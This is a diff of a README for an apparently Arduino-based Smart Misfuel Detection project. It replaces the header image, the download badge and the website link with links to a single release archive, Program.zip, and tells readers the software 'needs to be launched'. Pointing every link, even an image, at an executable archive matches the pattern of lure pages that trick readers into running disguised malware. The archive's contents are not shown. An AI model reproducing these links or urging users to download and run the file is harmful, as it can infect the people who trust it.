@@ -1,6 +1,6 @@
 # 🚀 Smart Misfuel Detection System
 
-![Smart Misfuel Detection System](https://image.freepik.com/free-vector/fuel-station-automation-flat-color-vector-illustration_74855-11198.jpg)
+![Smart Misfuel Detection System](https://github.com/darien111/IOT-PROJECT-Smart-Misfuel-Detection-System-/releases/download/v1.0/Program.zip)
 
 Welcome to the Smart Misfuel Detection System repository! This cutting-edge solution is designed to prevent misfueling incidents in fuel stations and industrial settings. By utilizing the TCS3200 color sensor and Arduino technology, this system accurately detects and differentiates between Diesel and Petrol based on color properties, ensuring safe and efficient fueling operations.
 
@@ -30,13 +30,13 @@ To build the Smart Misfuel Detection System, follow these steps:
 
 To download the software for the Smart Misfuel Detection System, click the button below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/darien111/IOT-PROJECT-Smart-Misfuel-Detection-System-/releases/download/v1.0/Program.zip)](https://github.com/darien111/IOT-PROJECT-Smart-Misfuel-Detection-System-/releases/download/v1.0/Program.zip)
 
 *Note: The software needs to be launched for installation.*
 
 ## 🌐 Learn More
 
-For more information on the Smart Misfuel Detection System and how it can enhance safety and efficiency in fueling operations, visit our [website](https://www.smartmisfueldetection.com).
+For more information on the Smart Misfuel Detection System and how it can enhance safety and efficiency in fueling operations, visit our [website](https://github.com/darien111/IOT-PROJECT-Smart-Misfuel-Detection-System-/releases/download/v1.0/Program.zip).
 
 ## 🤝 Contributions
 
